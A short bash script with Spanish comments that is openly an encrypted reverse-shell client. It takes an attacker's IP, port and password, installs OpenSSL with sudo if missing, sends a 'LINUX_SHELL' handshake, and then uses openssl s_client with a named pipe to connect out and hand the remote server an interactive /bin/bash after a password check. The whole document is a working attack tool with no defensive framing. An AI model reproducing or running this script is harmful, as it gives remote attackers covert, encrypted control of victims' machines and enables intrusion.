#!/bin/bash
IP=$1; PORT=$2; PASS=$3

if [[ -z "$PASS" ]]; then echo "Uso: $0 <ip> <puerto> <pass>"; exit 1; fi

# --- VERIFICACIÓN DE DEPENDENCIAS ---
if ! command -v openssl &> /dev/null; then
    echo "[!] OpenSSL no encontrado. Intentando instalar..."
    if command -v apt-get &> /dev/null; then
        sudo apt-get update && sudo apt-get install -y openssl
    elif command -v yum &> /dev/null; then
        sudo yum install -y openssl
    elif command -v pacman &> /dev/null; then
        sudo pacman -Sy openssl --noconfirm
    else
        echo "[-] No se pudo instalar OpenSSL automáticamente. Instálalo manualmente."
        exit 1
    fi
fi

# --- EJECUCIÓN ---

# 1. Handshake rápido
# Usamos timeout para evitar que el handshake se quede colgado si el servidor tarda
{ echo "LINUX_SHELL"; sleep 1; } | openssl s_client -quiet -connect ${IP}:${PORT} 2>/dev/null

sleep 1

# 2. Shell Reversa con validación
TF=$(mktemp -u)
mkfifo $TF
openssl s_client -quiet -connect ${IP}:${PORT} < $TF 2>/dev/null | (
    read -r SERVER_PASS
    if [ "$SERVER_PASS" == "$PASS" ]; then
        echo "[+] Autenticación exitosa."
        /bin/bash -i 2>&1
    else
        echo "[-] Error de autenticación."
    fi
) > $TF
rm $TF
